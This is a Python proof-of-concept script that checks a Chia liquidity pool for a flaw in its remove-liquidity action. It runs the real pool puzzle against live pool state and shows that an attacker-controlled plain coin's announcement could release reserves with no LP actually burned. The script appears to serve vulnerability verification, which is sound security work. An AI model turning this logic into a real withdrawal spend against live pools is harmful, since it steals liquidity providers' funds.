#!/usr/bin/env python3
"""Does the pool bind its LP action coin to the pool's own LP CAT?

MODE_REMOVE releases reserves in exchange for `burn = -lp_delta` LP being
destroyed. The pool's ONLY link to that destruction is:

    AssertCoinAnnouncement { id: sha256(lp_action_coin_id + acknowledgement) }

`lp_action_coin_id` is a free field in the action, checked only `!= zero`.
Nothing derives it from the pool's LP CAT puzzle hash (contrast the reserve
path, which derives successor_coin_id from the reserve puzzle hash and binds
it). A coin announcement is created by ANY coin running ANY puzzle -- the id is
sha256(coin_id, msg). So an attacker can name a plain coin they control as
`lp_action_coin_id`, have it emit CreateCoinAnnouncement(acknowledgement), and
the pool releases reserves while zero real LP is burned.

This runs the REAL compiled pool inner against REAL live pool state.
"""
import sys

sys.path.insert(0, ".")

from chia_rs import Coin
from chia_rs.sized_bytes import bytes32
from chia.types.blockchain_format.program import Program
from chia.wallet.cat_wallet.cat_utils import CAT_MOD, construct_cat_puzzle
from chia.wallet.trading.offer import OFFER_MOD_HASH

from _test_route_nasset import load_pools
from forge_offer import ZERO_32, MODE_REMOVE, _pool_inner

ASSERT_COIN_ANNOUNCEMENT = 61
CREATE_COIN = 51


def build_remove_plans(pool, burn):
    """A proportional two-asset withdrawal, exactly as build_transition_v3 does."""
    total_lp = int(pool.state[1])
    reserves = [(bytes32(r[0]), bytes32(r[1]), int(r[2])) for r in pool.state[0]]
    version = int(pool.config[0])
    reserve_inner = __import__("forge_offer").compiled_program(f"forge_reserve_v{version}")

    plans = []
    for asset_id, coin_id, amount in reserves:
        successor_amount = amount - amount * burn // total_lp
        released = amount - successor_amount
        is_native = asset_id == ZERO_32
        reserve_ph = (
            reserve_inner.get_tree_hash() if is_native
            else construct_cat_puzzle(CAT_MOD, asset_id, reserve_inner).get_tree_hash()
        )
        settlement_ph = (
            OFFER_MOD_HASH if is_native
            else construct_cat_puzzle(CAT_MOD, asset_id, __import__("chia.wallet.trading.offer", fromlist=["OFFER_MOD"]).OFFER_MOD).get_tree_hash()
        )
        successor_coin_id = Coin(coin_id, reserve_ph, successor_amount).name()
        settlement_coin_id = (
            Coin(coin_id, settlement_ph, released).name() if released > 0 else ZERO_32
        )
        plans.append([
            asset_id, coin_id, amount, settlement_coin_id,
            successor_coin_id, successor_amount,
        ])
    return plans


def run_remove(pool, burn, lp_action_coin_id):
    inner = _pool_inner(pool.singleton, pool.config, pool.state)
    action = [
        MODE_REMOVE,
        pool.pool.coin.name(),
        build_remove_plans(pool, burn),
        lp_action_coin_id,
        -burn,
    ]
    return inner.run(Program.to([action]))


def summarise(conditions):
    reserves_leaving = 0
    lp_assertions = []
    for cond in conditions.as_iter():
        items = list(cond.as_iter())
        opcode = items[0].as_int() if items else -1
        if opcode == ASSERT_COIN_ANNOUNCEMENT:
            lp_assertions.append(bytes(items[1].as_atom()))
    return lp_assertions


def main() -> int:
    pools = load_pools()

    # Prefer the newest live pool with two reserves and burnable LP.
    target = None
    for pool in sorted(pools.values(), key=lambda p: -int(p.config[0])):
        if int(pool.state[1]) > 100 and len(pool.state[0]) == 2:
            target = pool
            break
    if target is None:
        print("no usable two-asset pool found in live state")
        return 2

    version = int(target.config[0])
    total_lp = int(target.state[1])
    print(f"pool      {target.launcher_id.hex()[:16]}  V{version}")
    print(f"total_lp  {total_lp}")
    print(f"real LP CAT asset id  {target.lp_asset_id.hex()}")
    print()

    burn = total_lp // 2

    # A coin the ATTACKER controls: a plain (non-CAT) coin with a puzzle they
    # can spend. It is NOT the pool's LP CAT and never runs the LP TAIL.
    attacker_coin_id = Coin(
        bytes32(b"\xAA" * 32),   # arbitrary parent
        bytes32(b"\xBB" * 32),   # any p2 puzzle hash the attacker owns
        1,
    ).name()

    try:
        conditions = run_remove(target, burn, attacker_coin_id)
    except Exception as exc:
        print(f"[SAFE]  the pool REJECTED the attacker-controlled LP coin:")
        print(f"        {type(exc).__name__}: {exc}")
        return 0

    lp_assertions = summarise(conditions)
    print(f"[BUG]   the pool ACCEPTED a fabricated LP action coin.")
    print()
    plans = build_remove_plans(target, burn)
    print(f"        burning {burn} LP that the attacker never owned, reserves leaving:")
    for asset_id, _cid, amount, settle, _succ, successor_amount in plans:
        released = amount - successor_amount
        if released > 0:
            label = "TXCH" if asset_id == ZERO_32 else asset_id.hex()[:10]
            print(f"          {label:<12} {released} ({released / 1e12:.6f})")
    print()
    print(f"        the pool's ONLY LP-side requirement is a coin announcement:")
    for ann in lp_assertions:
        print(f"          ASSERT_COIN_ANNOUNCEMENT {ann.hex()[:40]}…")
    print(f"        satisfiable by ANY coin the attacker can spend -- no LP CAT,")
    print(f"        no TAIL, no real burn. Reserves leave; LP supply is untouched.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
